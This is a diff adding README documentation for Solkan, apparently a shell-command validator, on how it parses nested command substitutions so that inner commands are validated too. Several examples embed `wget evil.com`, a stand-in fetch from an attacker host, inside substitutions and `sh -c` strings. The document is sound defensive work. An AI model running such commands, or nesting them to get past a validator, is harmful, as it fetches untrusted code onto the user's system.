@@ -138,6 +138,22 @@ Solkan parses and validates the following structures:
 - `time echo hello` - timing prefix
 - `xargs grep pattern` - xargs command extraction
 - `sh -c 'echo hello && git status'` - shell command strings
+- `echo $(git status)` - command substitution
+  - Validates: `echo $(git status)`, `git status`
+- `` echo `git status` `` - command substitution with backticks
+  - Validates: `` echo `git status` ``, `git status`
+- `echo "$(git status)"` - command substitution inside double quotes
+  - Validates: `echo "$(git status)"`, `git status`
+- `FOO=$(git status) echo hello` - command substitution in a variable definition
+  - Validates: `echo hello`, `git status`
+- `for i in $(git branch); do echo $i; done` - command substitution in a for loop word list
+  - Validates: `git branch`, `echo $i`
+
+Solkan validates the inner command line of each command substitution like any
+other command line, and applies the rewrite list inside it.
+Command substitutions can be nested.
+- `echo "$(grep ok $(wget evil.com))"`
+  - Validates: `echo "$(grep ok $(wget evil.com))"`, `grep ok $(wget evil.com)`, `wget evil.com`
 
 All of the above can be combined and nested arbitrarily
 - `while true; do for i in 1 2; do echo $i | xargs sh -c 'grep ok && wget evil.com'; done; done`
